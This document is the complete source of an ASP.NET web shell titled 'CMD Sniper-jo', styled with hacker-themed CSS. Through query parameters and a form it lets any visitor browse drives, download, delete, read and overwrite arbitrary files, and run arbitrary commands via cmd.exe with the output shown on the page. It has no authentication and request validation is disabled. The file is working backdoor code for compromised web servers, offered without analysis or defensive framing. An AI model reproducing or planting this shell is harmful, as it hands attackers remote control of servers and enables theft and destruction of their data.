<style>
body{
background-attachment: fixed;
background-image: url(https://a.top4top.net/p_536nbk2f1.jpg);
background-color:#0A0A0A;color:#e1e1e1;
 opacity: 0.7;
}
*{
	font-size:11px;
	font-family:Tahoma,Verdana,Arial;
}
#menu{
	background-color:transparan;
	margin:8px 2px 4px 2px;
}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#FFFFFF; }
table.info{ color:#fff; background-color:#000000; }
span,a{ color: #66FF00 !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid #66FF00;padding: 2px 5px;font: 14pt Verdana;background-color:#000000;margin:0px;color:red; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#000000;border:1px solid #66FF00; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#000000;}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
</html>

<%@ Page Language="C#" EnableViewState="false" ValidateRequest="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%--<%@ Import Namespace="System.DirectoryServices" %>--%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<%
string outstr = "";

// get pwd
string dir = Page.MapPath(".") + "/";
if (Request.QueryString["fdir"] != null)
dir = Request.QueryString["fdir"] + "/";
dir = dir.Replace("\\", "/");
dir = dir.Replace("//", "/");

// build nav for path literal
string[] dirparts = dir.Split('/');
string linkwalk = "";	
foreach (string curpart in dirparts)
{
if (curpart.Length == 0)
continue;
linkwalk += curpart + "/";
outstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
HttpUtility.UrlEncode(linkwalk),
HttpUtility.HtmlEncode(curpart));
}
// create drive list
outstr = "";
foreach(DriveInfo curdrive in DriveInfo.GetDrives())
{
if (!curdrive.IsReady)
continue;
string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
outstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
HttpUtility.UrlEncode(driveRoot),
HttpUtility.HtmlEncode(driveRoot));
}

// send file ?
if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
{
Response.ClearContent();
Response.WriteFile(Request.QueryString["get"]);
Response.End();
}

// delete file ?
if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
File.Delete(Request.QueryString["del"]);	

// edit file ?
if ((Request.QueryString["edit"] != null) && (Request.QueryString["edit"].Length > 0))
{
btSave.Visible = tbEdit.Visible = true;
tbEdit.Text = File.ReadAllText(Request.QueryString["edit"]);
lbFilename.Text = Request.QueryString["edit"];
}

// enum directory and generate listing in the right pane
DirectoryInfo di = new DirectoryInfo(dir);
outstr = "";
foreach (DirectoryInfo curdir in di.GetDirectories())
{
string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
HttpUtility.UrlEncode(dir + "/" + curdir.Name),
HttpUtility.HtmlEncode(curdir.Name));
outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
}
foreach (FileInfo curfile in di.GetFiles())
{
string fstr = string.Format("<a href='?fdir={2}&edit={0}'>{1}</a>",
HttpUtility.UrlEncode(dir + "/" + curfile.Name),
HttpUtility.HtmlEncode(curfile.Name),
HttpUtility.UrlEncode(dir)
);
string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
HttpUtility.UrlEncode(dir),
HttpUtility.UrlEncode(dir + "/" + curfile.Name));
astr = astr + string.Format("&nbsp;<a href='?fdir={0}&edit={1}'>Edit</a>",
HttpUtility.UrlEncode(dir),
HttpUtility.UrlEncode(dir + "/" + curfile.Name));
outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
}
// exec cmd ?
if (txtCmdIn.Text.Length > 0)
{
Process p = new Process();
p.StartInfo.CreateNoWindow = true;
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.StartInfo.WorkingDirectory = dir;
p.Start();

lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
txtCmdIn.Text = "";
}	
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
<title>CMD Sniper-jo</title>
<script type="text/javascript">
function escapeHTMLEncode(str) {
var div = document.createElement('div');
var text = document.createTextNode(str);
div.appendChild(text);
return div.innerHTML;
}
</script>
<script runat="server">

private void OnShowIISClick(object sender, EventArgs e)
{
//DirectoryEntry iis = new DirectoryEntry("IIS://" + Environment.MachineName + "/w3svc");

//iis = new DirectoryEntry("IIS://" + Environment.MachineName + "/w3svc");

//foreach (DirectoryEntry site in iis.Children)
//{

// if (site.SchemaClassName == "IIsWebServer") //Web Sites have the IIsWebServer schema{
// {
// int id = Convert.ToInt32(site.Name);
// DirectoryEntry rootVDir = new DirectoryEntry("IIS://localhost/W3SVC/" + id + "/Root");
// string rootPath = rootVDir.Properties["Path"].Value.ToString();
// String url = site.Properties["ServerComment"].Value.ToString();
// Response.Write("<br>" + url + " - " + rootPath);
// }
//}
}
</script>
<script runat="server"> private void SaveClick(object sender, EventArgs e)
{
File.WriteAllText(HttpUtility.UrlDecode(Request.Params["edit"]), HttpUtility.HtmlDecode(tbEdit.Text));

}
</script>

</head>
<body>
<h1>CMD windows Sniper-Jo</h1>
<form id="form1" runat="server">
<table style="width: 100%; border-width: 0px; padding: 5px;">
<tr>
<td style="width: 50%; vertical-align: top;">
<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />

<asp:Button runat="server" ID="cmdExec" Text="Execute" />
<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
<asp:Label runat="server" ID="lbFilename" />
<asp:TextBox runat="server" ID="tbEdit" TextMode="MultiLine" Width="98%" Height="500" Visible="false" />
<asp:Button runat="server" ID="btSave" OnClick="SaveClick" Text="Save" Visible="false"/>
</td>
<td style="width: 50%; vertical-align: top;">
</td>
</tr>
</table>

</form>

</body>
</html>
